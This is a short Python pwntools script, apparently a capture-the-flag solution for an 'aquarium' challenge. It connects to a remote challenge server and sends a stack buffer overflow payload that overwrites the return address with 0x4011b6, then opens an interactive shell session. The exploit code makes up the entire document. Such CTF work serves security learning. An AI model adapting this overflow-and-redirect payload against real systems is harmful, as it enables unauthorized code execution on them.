from pwn import *
#p=process('./aquarium')
p=remote('shell.actf.co',19305)

p.sendline('1'*6)
pause()
p.sendline('A'*0x45+'\x00'*0x50+'B'*8+p64(0x4011b6))
p.interactive()
